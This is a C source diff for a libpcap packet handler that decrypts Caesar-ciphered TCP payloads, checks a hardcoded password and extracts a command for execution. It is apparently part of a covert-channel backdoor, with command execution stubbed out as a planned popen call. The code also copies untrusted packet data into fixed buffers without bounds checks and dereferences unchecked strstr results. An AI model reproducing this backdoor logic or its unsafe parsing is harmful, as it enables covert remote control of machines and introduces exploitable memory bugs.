@@ -69,11 +69,17 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	static int count = 0;
 	const struct ip_struct * ip;
 	const struct tcp_struct * tcp;
-	const char * payload;
+	const unsigned char * payload;
 
 	int size_ip;
 	int size_tcp;
 	int size_payload;
+	int mode;
+
+	
+	char password[strlen(PASSWORD) + 1];
+	char decrypted[PKT_SIZE];
+	char * command;
 
 	count++;
 
@@ -97,7 +103,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	size_tcp = TH_OFF(tcp) * 4;
 	
 	if (size_tcp < 20) {
-		printf("Invalid TCP header length: %u bytes\n", size_tcp);
+		fprintf(stderr, "Invalid TCP header length: %u bytes\n", size_tcp);
 		return;
 	}
 
@@ -106,7 +112,61 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	
 	/* compute tcp payload (segment) size */
 	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
+	printf("Size of payload: %d\n", size_payload);
+	/* Decrypt the payload */
+	strcpy(decrypted, DecryptCaesar(mDecipher, (char *) payload, MOD, START));
+
+	memset(password, 0, sizeof(password));
+	if(sscanf(decrypted, "%s %d", password, &mode) < 2)
+	{
+		fprintf(stderr, "scanning error\n");
+		return;
+	}
+	command = parse_cmd(decrypted);
+
+	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
+	{
+		fprintf(stderr, "Password Authenticated. Executing command.\n");
+		send_command(command);
+		return;
+	}
+	else if (mode == CLIENT_MODE)
+	{
+		printf("%s", command);
+		return;
+	}
+	else
+	{
+		fprintf(stderr, "Incorrect Password\n");
+		return;
+	}
 
 
 
+}
+char * parse_cmd(char * data)
+{
+	char * start, * end;
+	char * command = malloc((PKT_SIZE) * sizeof(char));
+
+	/* Point to the first occurance of pre-defined command string */
+	start = strstr(data, CMD_START);
+
+	/* Jump ahead past the pre-defined command string to point to the first
+	   actual command character */
+	start += strlen(CMD_START);
+
+	/* Find the command end string, starting from the start pointer */
+	end = strstr(start, CMD_END);
+
+	memset(command, 0, PKT_SIZE);
+	strncpy(command, start, (end - start));
+
+	return command;
+}
+
+void send_command(char * command)
+{
+	/* use popen here */
+	/* use send_packet */
 }
